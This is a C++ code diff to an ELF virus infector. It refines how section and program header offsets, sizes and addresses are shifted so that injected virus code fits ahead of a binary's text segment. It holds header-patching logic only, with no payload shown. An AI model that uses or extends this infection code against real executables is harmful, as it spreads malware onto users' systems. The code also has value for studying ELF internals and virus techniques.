@@ -50,7 +50,10 @@ bool patch_sht(vt::common::Mmap<PROT_READ | PROT_WRITE>& output_mapping,
  */
   for (size_t i = 0; i < sht_entry_count; ++i) {
     auto cur_entry = section_entry + i;
-    cur_entry->sh_offset += extra_space;
+    if (cur_entry->sh_offset) {
+      // avoid patching special sections for example the very first null section.
+      cur_entry->sh_offset += extra_space;
+    }
   }
   return true;
 }
@@ -70,9 +73,15 @@ void patch_phdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
   for (size_t idx = 0; idx < pht_entry_count; idx++) {
     auto cur_entry = phdr_entry + idx;
     if (idx == code_segment_idx) {
-      // RX segment loads from offset 0 to the end of all CODE sections.
+      // Sometimes RX segment loads from offset 0 to the end of all CODE sections.
       // It includes ehdr, virus, phdr and executable sections. Therefore we
       // don't need to shift the file offset here.
+      // It's also possible that RX segment has a non-zero file offset, with one
+      // readonly section preceeding it, loading ehdr, phdr and sections before .text.
+      // In that case, increase the file size for that section and offset for code.
+      if (cur_entry->p_offset) {
+        cur_entry->p_offset += extra_space;
+      }
       if (cur_entry->p_vaddr) {
         cur_entry->p_vaddr -= extra_space;
       }
@@ -82,10 +91,15 @@ void patch_phdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
 
       cur_entry->p_filesz += extra_space;
       cur_entry->p_memsz += extra_space;
-    } else if (cur_entry->p_offset) {
+    } else if (cur_entry->p_offset && cur_entry->p_filesz) {
       // shift file offset for all other segments execept special ones like
       // GNU_STACK.
       cur_entry->p_offset += extra_space;
+    } else if (!cur_entry->p_offset && cur_entry->p_filesz) {
+      // For none CODE segment, that has none zero start and a file size,
+      // it's likely loading ehdr + phdr + readonly segments.
+      cur_entry->p_filesz += extra_space;
+      cur_entry->p_memsz += extra_space;
     }
   }
 }
